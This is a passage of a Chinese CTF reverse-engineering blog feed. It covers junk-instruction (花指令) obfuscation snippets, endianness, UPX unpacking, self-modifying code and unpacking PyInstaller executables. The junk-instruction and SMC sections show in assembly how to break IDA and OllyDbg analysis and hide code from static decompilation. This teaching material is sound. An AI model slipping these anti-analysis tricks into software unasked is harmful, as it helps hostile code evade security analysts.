punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (压入时自动减 4)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>eax<span class="token punctuation">)</span>     <span class="token comment">// 将指定的操作数送入新的栈顶位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>正常情况下，push 操作需要对应一个 pop 操作来保持堆栈的平衡</strong><br>在 32位 下，<code>pop eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>eax<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">// 将栈顶位置送入指定的操作数</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (退出时自动加 4)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>后面跟着的 <code>add esp, 4</code> 起到了 pop 指令的部分功能，也就是恢复了堆栈的平衡，使得程序能够正常运行<br>但在 IDA 中却无法正常识别这种操作，所以 IDA 进行解析时会认为该函数堆栈不平衡，从而使F5功能失效</strong><br><img src="https://s2.loli.net/2023/03/17/p2tLg6oSuRHNDPc.png" alt="CTF - Reverse_花指令4.png"></p><hr><h3 id="不可执行的花指令"><a href="#不可执行的花指令" class="headerlink" title="不可执行的花指令"></a>不可执行的花指令</h3><blockquote><p>花指令虽然被插入到了正常代码的中间，但是并不意味着它一定会得到执行。</p><p>这类不可执行的花指令通常形式为：<mark>在代码中出现了类似数据的代码，或者 IDA 反汇编后为 JUMPOUT(xxxxx)</mark></p><p>这类花指令一般不属于 CPU 可识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序的正常运行</p></blockquote><ul><li><strong>示例 1：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>_emit <span class="token number">0x11</span><span class="token punctuation">;</span>   <span class="token comment">// _emit 指令为：插入字节码</span>_emit <span class="token number">0x22</span><span class="token punctuation">;</span>_emit <span class="token number">0x33</span><span class="token punctuation">;</span>   <span class="token comment">// 0x33是 xor 指令的操作码，会导致后面正常的 Push 指令被错误解析</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于经过 <code>xor eax, eax</code> 后，ZF 标志位被置为 1，那么 jz 这条跳转指令必定会被执行，后面插入的 <code>0x11</code>，<code>0x22</code>，<code>0x33</code> 就会被跳过，程序正常输出： <code>Hello World!</code><br>但是在 IDA 中，IDA 已经无法正确解析这段代码：<br><img src="https://s2.loli.net/2023/03/18/s96JnKrg1o5tlYW.png" alt="NSSCTF-jump_by_jump2.png"></p><ul><li><strong>示例 2：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>插入的花指令也可以是改变堆栈平衡的汇编代码，虽然这里的花指令不会被执行，但是 IDA 进行解析时会认为该函数堆栈不平衡，从而使 F5 功能失效</p><hr><h3 id="花指令的实现"><a href="#花指令的实现" class="headerlink" title="花指令的实现"></a>花指令的实现</h3><ol><li><strong>简单jmp</strong><br>这是最简单的花指令。OD 能被骗过去，但是因为 IDA 采用的是递归扫描法，所以能够正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>jmp label1db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>多层跳转</strong><br>本质上和简单跳转是一样的，只是加了几层跳转。无法干扰 IDA</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">start<span class="token operator">:</span>   <span class="token comment">//花指令开始</span>    jmp label1    DB junkcodelabel1<span class="token operator">:</span>     jmp label2     DB junkcodelabel2：    jmp label3    DB junkcodelabel3   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>jnx 和 jx 条件跳转</strong><br>利用 jz 和 jnz 的互补条件跳转指令来代替 jmp。无法干扰吾爱破解版 OllyDBG，但 IDA 不能正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">_asm<span class="token punctuation">&#123;</span>    jz label1    jnz label1    db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>永真条件跳转</strong><br>通过设置永真或永假的条件，导致程序一定会执行。也可以调用某些会返回确定值的函数，来达到构造永真或永假条件。这种方式 IDA 和 OD 都无法正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    push ebx    xor ebx<span class="token punctuation">,</span>ebx    test ebx<span class="token punctuation">,</span>ebx    jnz label1    jz label2label1<span class="token operator">:</span>    _emit junkcodelabel2<span class="token operator">:</span>   pop ebx   <span class="token comment">//需要恢复ebx寄存器    </span><span class="token punctuation">&#125;</span>__asm<span class="token punctuation">&#123;</span>clcjnz label1<span class="token operator">:</span>_emit junkcodelabel1<span class="token operator">:</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>call &amp; ret 构造花指令</strong><br>利用 call 和 ret，在函数中修改返回地址，达到跳过 thunkcode 到正常流程的目的。可以干扰 IDA 的正常识别</li></ol><blockquote><p>call指令：将下一条指令地址压入栈，再跳转执行<br>ret指令：将保存的地址取出，跳转执行</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    call label1    _emit junkcodelabel1<span class="token operator">:</span>    add dword ptr ss<span class="token operator">:</span><span class="token punctuation">[</span>esp<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span>   <span class="token comment">//具体增加多少根据调试来</span>    ret    _emit junkcode<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>汇编指令共用 opcode</strong><br>jmp 的条指令是 <code>inc eax</code> 的第一个字节，<code>inc eax</code> 和 <code>dec eax</code> 抵消影响。这种共用 opcode 的方法比较麻烦<br><img src="https://s2.loli.net/2023/03/17/FMXUuecd8JoTAV7.png" alt="CTF - Reverse_花指令5.png"><br><img src="https://s2.loli.net/2023/03/17/sNhcongQPjmZKHG.png" alt="CTF - Reverse_花指令6.png"></li></ol><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;花指令（代码与数据混合）&quot;&gt;&lt;a href=&quot;#花指令（代码与数据混合）&quot; class=&quot;headerlink&quot; title=&quot;花指令（代码与数据混合）&quot;&gt;&lt;/a&gt;花指令（代码与数据混合）&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;花指令实质就是一串垃圾指令，它与程</summary>
      
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>大端序和小端序</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F/</id>
    <published>2023-03-19T07:23:04.000Z</published>
    <updated>2023-03-19T07:31:16.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h2><h3 id="主要分为-大端序（Big-endian）和小端序（Little-endian），区别如下："><a href="#主要分为-大端序（Big-endian）和小端序（Little-endian），区别如下：" class="headerlink" title="主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下："></a>主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下：</h3><blockquote><p><mark>大端序</mark>：高位字节 -> 低地址，低位字节 -> 高地址<br><mark>小端序</mark>：低位字节 -> 低地址，高位字节 -> 高地址</p></blockquote><hr><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><blockquote><p>若为常见的大小类型（如 int）， 则是顺序（高位在左）<br>若为其他的大小类型（如 int64），则是逆序（高位在右）</p></blockquote><p><img src="https://s2.loli.net/2023/03/17/279vjKFm3txQDk6.png" alt="CTF - Reverse_大端序和小端序1.png"></p><blockquote><p><strong><em>不管是大端法还是小端法存储，计算机在内存中存放数据的顺序都是从低地址到高地址</em></strong><br><strong><em>不同的是，取低字节的数据存放在低地址，还是取高字节数据存放在低地址</em></strong></p></blockquote><ul><li>例如，将 12345678h 写入 1000h 开始的内存中，以大端序和小端序模式存放结果如下：<br><img src="https://s2.loli.net/2023/03/17/Pm2r6WLoHw5vuDc.png" alt="CTF - Reverse_大端序和小端序2.png"></li></ul><ol><li>在小端顺序里， v1 = 0x12345678 在内存的字节码中看起来是这样 78h 56h 34h 12h，这没有问题<br>如果这时有 v2 = 0x1234，在内存的字节码中看起来是 34h 12h</li><li>假如 v2 后面紧接着 v1 的话，字节码应该就是 34h 12h 78h 56h 34h 12h<br>再放一个 v3 = 0x12 的话，总的排序就是 12h 34h 12h 78h 56h 34h 12h</li></ol><blockquote><p>一般来说，x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序<br>但是对于 [1, 2, 3, 4] 这么一个数组，并不会受到字节序的影响。它的排序无论大端序还是小端序都是一样的</p></blockquote><hr><h3 id="在-IDA-中，F5-查看伪代码后，如果看到："><a href="#在-IDA-中，F5-查看伪代码后，如果看到：" class="headerlink" title="在 IDA 中，F5 查看伪代码后，如果看到："></a>在 IDA 中，F5 查看伪代码后，如果看到：</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">_DWORD v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6C0B67</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x175F4078</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3302058</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x725D1244</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2E1F3441</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6847404D</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意最开始的数据类型，这个数组不仅要按照4字节左侧补零对齐，还要将每一组数据翻转拼接才能得到正确的字符串，ida并没有非常智能地帮你捋顺字符串，所以初学的话非常有迷惑性</p><p>例如：<br><code>v4[2] = 0x3302058；</code><br>应为 0x03302058 —&gt; 0x58，0x20，0x30，0x03</p></blockquote><hr><h3 id="db、dw、dd、dq"><a href="#db、dw、dd、dq" class="headerlink" title="db、dw、dd、dq"></a>db、dw、dd、dq</h3><blockquote><p>伪指令 db、dw、dd、dq 都可以定义字符串，但最多的是用 db 来定义字符串</p></blockquote><ol><li>第一个原因是 dw、dd定义的字符串到了内存中排序是相反的<ul><li><strong>在字符串 “abcd” 中，元素按从 高位 向 低位 线性排序</strong></li><li><strong>在内存中，数据由 低位 向 高位 线性排序</strong></li><li>因此字符串 “abcd” 在内存中的顺序是从 低位 向 高位 排序的，所以相反，即 小端序</li></ul></li><li>第二个原因是 不同版本编译器对 dw 与 dd 定义字符串的指令格式支持不一样<ul><li>db 定义字节类型变量，一个字节数据占 1个 字节单元，读完一个，偏移量加 1 （ 1个 十六进制数）</li><li>dw 定义字类型变量，一个字数据占 2个 字节单元，读完一个，偏移量加 2 （ 2个 十六进制数）</li><li>dd 定义双字类型变量，一个双字数据占 4个 字节单元，读完一个，偏移量加 4 （ 4个 十六进制数）</li><li>dq 定义四字类型变量，一个四字数据占 8个 字节单元，读完一个，偏移量加 8 （ 8个 十六进制数）</li></ul></li><li><strong>db 是一字节，按顺序一个一个存储</strong><ul><li><em>用 db 定义字符串时，存储方式是顺着的，即 大端序</em></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;字节存储顺序&quot;&gt;&lt;a href=&quot;#字节存储顺序&quot; class=&quot;headerlink&quot; title=&quot;字节存储顺序&quot;&gt;&lt;/a&gt;字节存储顺序&lt;/h2&gt;&lt;h3 id=&quot;主要分为-大端序（Big-endian）和小端序（Little-endian），区别如下：&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>UPX脱壳</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/UPX%E8%84%B1%E5%A3%B3/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/UPX%E8%84%B1%E5%A3%B3/</id>
    <published>2023-03-19T07:22:52.000Z</published>
    <updated>2023-03-19T07:29:52.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="upx-脱壳工具下载地址"><a href="#upx-脱壳工具下载地址" class="headerlink" title="upx 脱壳工具下载地址"></a>upx 脱壳工具下载地址</h2><blockquote><p><a href="https://fossies.org/windows/misc/upx-3.96-win64.zip/">upx 3.96-win64 - Download</a></p></blockquote><hr><h2 id="脱壳操作"><a href="#脱壳操作" class="headerlink" title="脱壳操作"></a>脱壳操作</h2><ol><li><p>将加壳文件置于解压后的 <code>D:\upx-3.96-win64</code> 文件夹下</p></li><li><p>脱壳语句：</p></li></ol><blockquote><p>upx -d &lt;脱壳文件名&gt;</p></blockquote><p><img src="https://s2.loli.net/2023/03/17/ID3qzT9Nl6f85B1.png" alt="CTF - Reverse_upx 脱壳1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;upx-脱壳工具下载地址&quot;&gt;&lt;a href=&quot;#upx-脱壳工具下载地址&quot; class=&quot;headerlink&quot; title=&quot;upx 脱壳工具下载地址&quot;&gt;&lt;/a&gt;upx 脱壳工具下载地址&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://</summary>
      
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>SMC自解码</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/SMC%E8%87%AA%E8%A7%A3%E7%A0%81/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/SMC%E8%87%AA%E8%A7%A3%E7%A0%81/</id>
    <published>2023-03-19T07:22:42.000Z</published>
    <updated>2023-03-19T07:29:25.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><blockquote><p><strong>自修改代码</strong>，简而言之，就是程序中的部分代码在运行之前被加密成一段数据，不可反编译，通过程序运行后执行相关的解码功能，对加密的代码数据进行解密，让其恢复正常功能</p></blockquote><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>代码在二进制文件中就是字节码，本身也就是一段二进制数据</li><li>提前手动将要修改的代码部分替换为加密数据，运行自己的函数对修改部分进行解码</li><li>通过这种方式，对核心代码进行 <code>SMC</code> 加密，<em>程序在被静态反编译的时候，核心代码就是一串数据无法反编译，而程序在运行的时候又能成功将这段核心代码复原</em>。从而实现保护程序，同时亦可以将一些特征代码变形隐藏</li></ul><hr><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><blockquote><p>写在前面：在自己实现 <code>SMC</code> 时，一定注意 <code>SMC</code> 加解密代码所属的节区是否有<strong>可写权限</strong></p></blockquote><ol><li>有两个函数，一个函数加密，一个函数解密，两者对应</li><li>找到要进行 <code>SMC</code> 的代码地址，然后事先在程序开始的地方设置：对该地址数据的解密函数</li><li>取出要进行 <code>SMC</code> 的代码的字节码，对其进行加密操作得到一串加密数据</li><li>用这串加密数据替换原代码的字节码</li></ol><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SMC&quot;&gt;&lt;a href=&quot;#SMC&quot; class=&quot;headerlink&quot; title=&quot;SMC&quot;&gt;&lt;/a&gt;SMC&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;自修改代码&lt;/strong&gt;，简而言之，就是程序中的部分代码在运行之前被加密成一段数据，不</summary>
      
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>Python逆向</title>
    <link href="https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/Python%E9%80%86%E5%90%91/"/>
    <id>https://4ss1du0us.github.io/2023/03/19/CTF%20-%20Reverse/Python%E9%80%86%E5%90%91/</id>
    <published>2023-03-19T07:22:27.000Z</published>
    <updated>2023-03-19T07:28:58.357Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python逆向特点"><a href="#Python逆向特点" class="headerlink" title="Python逆向特点"></a>Python逆向特点</h2><ul><li>在 exeinfo pe 中查看到文件信息：<br><img src="https://s2.loli.net/2023/03/17/fS2HF8Oa6CUBYtP.png" alt="CTF - Reverse_Python逆向1.png"></li><li><mark>在文件信息中出现 PyInstaller 即为 Python 文件经过 pyinstaller 打包生成的可执行 .exe 文件</mark></li><li>这类由 Python 生成的可执行文件无法通过 IDA 反编译，需要使用 pyinstxtractor.py 文件进行解包得到 Python 的反编译文件 .pyc</li></ul><hr><h2 id="Python-逆向流程"><a href="#Python-逆向流程" class="headerlink" title="Python 逆向流程"></a>Python 逆向流程</h2><ul><li>下载 pyinstxtractor.py 工具包<br><img src="https://s2.loli.net/2023/03/17/A7Nq8RfxQdyTu25.png" alt="CTF - Reverse_Python逆向2.png"></li></ul><ol><li>将 pyinstxtractor.py 文件置于 pyinstaller 打包成的 .exe 文件夹下</li><li><p>在该目录下执行 cmd，输入：</p><blockquote><p><code>python pyinstxtractor.py &lt;exe 文件名&gt;</code></p></blockquote></li><li><p>转换后会在该目录下生成一个文件夹，其中必定存在一个无后缀名的 struct 文件，通过 exeinfo pe 可查看该文件为 .pyc 文件<mark>【必要时可用它恢复文件头】</mark></p></li></ol><hr><h2 id="Python-反编译"><a href="#Python-反编译" class="headerlink" title="Python 反编译"></a>Python 反编译</h2><ul><li><p>在 .pyc 文件目录下，执行 cmd：</p><blockquote><p><code>uncompyle6 &lt; pyc 文件名&gt;</code><br><code>uncompyle6 -o &lt; py 文件名&gt; &lt; pyc 文件名&gt;</code></p></blockquote></li><li><p>若 Python 版本不对，会提示 KeyError: ‘3.10.4’ （ 3.10.4 为 Python 版本）</p></li></ul><hr><h2 id="pyc-文件头"><a href="#pyc-文件头" class="headerlink" title="pyc 文件头"></a>pyc 文件头</h2><ul><li>1</li><li>方法一：<br>通过 Pycharm 手动生成 .pyc 文件，获取文件头，代码如下：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 代码开头需导入py_compile</span><span class="token keyword">import</span> py_compile<span class="token comment"># 随意写正确的python代码即可</span><span class="token keyword">def</span> <span class="token function">print_hi</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Hi, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>print_hi<span class="token punctuation">(</span><span class="token string">'PyCharm'</span><span class="token punctuation">)</span><span class="token comment"># 最后调用该函数进行编译操作，单引号中是保存路径</span>py_compile<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'D:\py_project'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>方法二：<br>通过 cmd 命令生成 .pyc 文件</p><blockquote><p><code>python -m py_compile &lt;py 文件名&gt;</code></p></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Python逆向特点&quot;&gt;&lt;a href=&quot;#Python逆向特点&quot; class=&quot;headerlink&quot; title=&quot;Python逆向特点&quot;&gt;&lt;/a&gt;Python逆向特点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;在 exeinfo pe 中查看到文件信息：&lt;br&gt;&lt;img s</summary>
      
    
    
    
    <category term="逆向" scheme="https://4ss1du0us.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://4ss1du0us.github.io/tags/REVERSE/"/>
    
  </entry>
  
</feed>
